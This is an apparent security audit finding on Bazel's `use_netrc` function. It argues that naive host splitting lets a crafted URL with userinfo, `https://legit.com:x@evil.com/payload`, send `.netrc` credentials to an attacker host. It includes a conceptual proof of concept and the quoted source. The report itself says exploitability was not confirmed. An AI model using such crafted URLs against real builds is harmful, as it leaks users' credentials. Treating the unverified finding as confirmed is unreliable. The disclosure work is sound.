## Title
Host/userinfo parser confusion in `use_netrc` leaks credentials to attacker-controlled host - (`tools/build_defs/repo/utils.bzl`)

### Summary
`use_netrc` in `tools/build_defs/repo/utils.bzl`, used by `get_auth()` (called from `http_archive`/`http_file`/`http_jar`/`git_repository` implementations in `tools/build_defs/repo/http.bzl` and `git.bzl`) to decide which `.netrc` credentials to attach to a given download URL, derives the "host" for credential matching with naive string splitting instead of RFC 3986-compliant URL parsing: [1](#0-0) 

```
for url in urls:
    schemerest = url.split("://", 1)
    ...
    host = schemerest[1].split("/")[0].split(":")[0]
```

### Finding Description
`host` is computed by taking everything before the first `/` and then before the first `:`. For an ordinary URL like `https://example.com/path`, this correctly yields `example.com`. But for a URL containing userinfo (the standard `user:password@host` authority syntax that `java.net.URL`/`java.net.URI`/most HTTP clients parse per RFC 3986), the naive split misidentifies the authority component.

Concretely, for `https://legit.com:x@evil.com/foo`:
- The authority is `legit.com:x@evil.com`.
- Standard URL parsing splits on the last `@` to get `userinfo=legit.com:x`, `host=evil.com` — the real TCP connection target is `evil.com`.
- `use_netrc`'s naive parser instead does `"legit.com:x@evil.com".split(":")[0]` → `"legit.com"`, treating the URL's host as `legit.com`.

If the user's `.netrc` has an entry for `legit.com` (a legitimate, trusted host), `use_netrc` will attach that host's login/password (or `auth_patterns`-based bearer token) to the `auth` dict keyed by the full URL string, and that `auth` entry is then passed straight to `ctx.download()`: [2](#0-1) 

The actual HTTP connection made by `ctx.download` (Bazel's native downloader) will parse the same URL according to standard URL semantics and connect to `evil.com`, sending along the `legit.com` credentials that `use_netrc` incorrectly attributed to it. This is the same class of bug as the OWASP Coraza report: two different components (a naive component making a security decision — credential selection — and the real network/parsing component performing the connection) disagree about what "host" a URL string designates, and the naive one is used for the trust decision.

### Impact Explanation
This breaks the invariant that "credentials are host-scoped." A URL that superficially appears to target `legit.com` in the naive parser's eyes actually causes a network connection to an attacker-chosen host (`evil.com`), while transmitting the user's `legit.com` netrc secret (login/password, or a bearer token formatted via `auth_patterns`) to that attacker-controlled host. Any repository rule that passes an attacker/registry-influenced URL through `get_auth`/`use_netrc` (e.g., `http_archive`, `http_file`, `http_jar`, or custom `repository_rule`s using `use_netrc` directly) is affected if the URL list can contain a userinfo-crafted string.

### Likelihood Explanation
Exploitation requires a URL string containing a crafted userinfo component (`legit.com:x@evil.com/...`) to reach `use_netrc`/`get_auth`. URLs in `http_archive`/`http_file` are normally attacker-controlled only when sourced from a hostile module registry, mirror list, or an untrusted branch's WORKSPACE/MODULE-adjacent data that flows into `url`/`urls` attributes without becoming trusted root-repo Starlark itself (the URL string is data, not code). Whether Bazel's real native downloader accepts and connects using this userinfo-in-authority syntax could not be independently confirmed in this pass — the Java-side downloader/`UrlRewriter`/connector classes are not present in this codebase's indexed content (only documentation and Starlark `.bzl` files are indexed here), so I could not directly inspect `HttpConnector`/`URL`-parsing code to verify how it treats `user:pass@host` authorities end-to-end.

### Recommendation
Replace the manual `split("://")`/`split("/")`/`split(":")` host extraction in `use_netrc` with parsing that correctly handles the `userinfo@host[:port]` authority form (i.e., split on the **last** `@` before extracting the host, then split on `:` only after removing any userinfo prefix), matching the semantics of the actual URL parser used when Bazel performs the download.

### Proof of Concept
Not independently executed in this pass (no access to a running Bazel or the actual native downloader implementation in the indexed content). Conceptual PoC:
1. Create a `.netrc` with `machine legit.com` + `login`/`password`.
2. Define an `http_file`/`http_archive` (or custom repo rule calling `use_netrc`) with `url = "https://legit.com:x@evil.com/payload"`.
3. Observe (via a controlled HTTP listener on `evil.com`, e.g., in `src/test/shell/bazel/starlark_repository_test.sh`-style test) whether the `Authorization`/basic-auth header derived from the `legit.com` netrc entry is sent in the request actually received by `evil.com`. [3](#0-2) 

**Uncertainty note:** I was not able to confirm from the available index whether Bazel's native (Java) HTTP downloader actually accepts/connects using userinfo-containing authorities exactly as `java.net.URL`/RFC 3986 would, since the relevant Java downloader/connector source files were not present in this codebase's search index (only Starlark, docs, and shell test files were indexed for the fetch/auth path). This should be verified directly against `src/main/java/com/google/devtools/build/lib/bazel/repository/downloader/` in a full checkout before treating this as a confirmed, exploitable finding.

```text
def use_netrc(netrc, urls, patterns):
    """Compute an auth dict from a parsed netrc file and a list of URLs.

    Args:
      netrc: a netrc file already parsed to a dict, e.g., as obtained from
        read_netrc
      urls: a list of URLs.
      patterns: optional dict of url to authorization patterns

    Returns:
      dict suitable as auth argument for ctx.download; more precisely, the dict
      will map all URLs where the netrc file provides login and password to a
      dict containing the corresponding login, password and optional authorization pattern,
      as well as the mapping of "type" to "basic" or "pattern".
    """
    auth = {}
    for url in urls:
        schemerest = url.split("://", 1)
        if len(schemerest) < 2:
            continue
        if not (schemerest[0] in ["http", "https"]):
            # For other protocols, bazel currently does not support
            # authentication. So ignore them.
            continue
        host = schemerest[1].split("/")[0].split(":")[0]
        if host in netrc:
            authforhost = netrc[host]
        elif "" in netrc:
            authforhost = netrc[""]
        else:
            continue

        if host in patterns:
            auth_dict = {
                "type": "pattern",
                "pattern": patterns[host],
            }

            if "login" in authforhost:
                auth_dict["login"] = authforhost["login"]

            if "password" in authforhost:
                auth_dict["password"] = authforhost["password"]

            auth[url] = auth_dict
        elif "password" in authforhost:
            if "login" in authforhost:
                auth[url] = {
                    "type": "basic",
                    "login": authforhost["login"],
                    "password": authforhost["password"],
                }
            else:
                auth[url] = {
                    "type": "pattern",
                    "pattern": "Bearer <password>",
                    "password": authforhost["password"],
                }
        else:
            # buildifier: disable=print
            print("WARNING: Found machine in .netrc for URL %s, but no password." % url)

    return auth
```
